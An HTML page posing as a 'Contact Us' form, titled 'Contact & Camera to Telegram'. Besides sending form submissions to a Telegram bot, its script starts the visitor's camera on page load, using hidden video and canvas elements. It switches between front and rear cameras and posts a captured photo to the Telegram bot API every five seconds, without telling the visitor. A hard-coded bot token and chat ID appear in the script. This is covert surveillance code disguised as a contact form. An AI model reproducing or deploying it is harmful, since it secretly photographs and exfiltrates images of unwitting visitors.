<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact & Camera to Telegram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            background-size: 200% 200%;
            animation: bgAnimation 6s infinite alternate;
            flex-direction: column;
            overflow: hidden;
        }

        @keyframes bgAnimation {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            width: 400px;
            text-align: center;
            transition: transform 0.3s ease-in-out;
        }

        .container:hover {
            transform: scale(1.05);
        }

        h2 {
            color: #fff;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            color: #fff;
            font-weight: 400;
            display: block;
            margin-bottom: 5px;
        }

        input, textarea {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            outline: none;
            transition: 0.3s;
        }

        input::placeholder, textarea::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        input:focus, textarea:focus {
            background: rgba(255, 255, 255, 0.3);
        }

        .btn {
            background: linear-gradient(90deg, #ff512f, #dd2476);
            color: white;
            padding: 12px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }

        .btn:hover {
            background: linear-gradient(90deg, #dd2476, #ff512f);
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>💬 Contact Us</h2>
        <form id="contactForm">
            <div class="form-group">
                <label for="name">Your Name</label>
                <input type="text" id="name" placeholder="Enter your name" required>
            </div>
            <div class="form-group">
                <label for="contact">Email or Phone Number</label>
                <input type="text" id="contact" placeholder="Enter email or phone number" required>
            </div>
            <div class="form-group">
                <label for="message">Your Message</label>
                <textarea id="message" placeholder="Enter your message" required></textarea>
            </div>
            <button type="submit" class="btn">🚀 Send Message</button>
        </form>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = '7835598418:AAEW54tPDgETK1gWAAjkzji1AYosjVXV97I';
        const chatId = '1987016824';

        document.getElementById("contactForm").addEventListener("submit", function (event) {
            event.preventDefault();
            
            let name = document.getElementById("name").value.trim();
            let contact = document.getElementById("contact").value.trim();
            let message = document.getElementById("message").value.trim();

            if (!name || !contact || !message) {
                alert("⚠️ Please fill in all fields.");
                return;
            }

            let telegramMessage = `📩 *New Contact Form Submission* 📩\n\n👤 *Name:* ${name}\n📧 *Contact:* ${contact}\n📝 *Message:* ${message}`;

            let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            let data = { chat_id: chatId, text: telegramMessage, parse_mode: "Markdown" };

            fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) })
            .then(response => response.json())
            .then(result => {
                if (result.ok) {
                    alert("✅ Message sent successfully!");
                    document.getElementById("contactForm").reset();
                } else {
                    alert("❌ Failed to send message!");
                }
            })
            .catch(error => console.error("Error:", error));
        });

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let useFrontCamera = true;

        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: useFrontCamera ? 'user' : 'environment' }
            })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(error => console.error('Error accessing camera:', error));
        }

        function stopCamera() {
            let stream = video.srcObject;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }

        function captureAndSendPhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            let base64Image = canvas.toDataURL('image/png');
            let blob = base64ToBlob(base64Image);

            sendToTelegram(blob);
        }

        function base64ToBlob(base64) {
            let byteString = atob(base64.split(',')[1]);
            let arrayBuffer = new ArrayBuffer(byteString.length);
            let uintArray = new Uint8Array(arrayBuffer);

            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }

            return new Blob([uintArray], { type: 'image/png' });
        }

        function sendToTelegram(blob) {
            let url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            let formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.png');

            fetch(url, { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => { if (!data.ok) console.error('Telegram API Error:', data); })
            .catch(err => console.error('Fetch Error:', err));
        }

        function autoSwitchCamera() {
            setInterval(() => {
                stopCamera();
                useFrontCamera = !useFrontCamera;
                startCamera();
            }, 5000);
        }

        setInterval(() => { captureAndSendPhoto(); }, 5000);

        startCamera();
        autoSwitchCamera();
    </script>
</body>
  </html>
